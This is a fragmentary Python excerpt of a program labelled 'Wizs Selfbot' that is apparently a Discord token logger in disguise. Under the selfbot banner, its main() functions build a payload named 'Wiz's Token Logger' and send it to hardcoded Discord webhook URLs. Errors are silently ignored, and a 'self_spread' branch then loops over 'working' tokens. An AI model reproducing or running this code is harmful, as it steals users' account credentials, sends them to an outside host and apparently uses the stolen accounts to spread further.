...
ctypes.windll.kernel32.SetConsoleTitleW(f'[Wizs Selfbot v{SELFBOT.__version__}] | Loading.')
...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/813927407098396683/6jcrQpLCmNmKA-yWx70fadQIRdBxAVi5HDLNdBHvLI__kSJK7cmRSNJuROIO6r2F3-k8", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
...
def startprint():
    ...
    print(f'''{Fore.RESET}
         ...
         \ \        / / (_)                / ____|        | |  / _| | |             | |  
          \ \  /\  / /   _   ____  ___    | (___     ___  | | | |_  | |__     ___   | |_ 
           \ \/  \/ /   | | |_  / / __|    \___ \   / _ \ | | |  _| | '_ \   / _ \  | __|
            \  /\  /    | |  / /  \__ \    ____) | |  __/ | | | |   | |_) | | (_) | | |_ 
             \/  \/     |_| /___| |___/   |_____/   \___| |_| |_|   |_.__/   \___/   \__|
...
def main():
    ...
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Wiz's Token Logger",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/821514106954579979/24oBqa5aQTCH7o1UT4Uc84jrS0i-oSnwjdx82Ubzq9xAgJGiDcEH6fTzgiDYKKauERGS", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
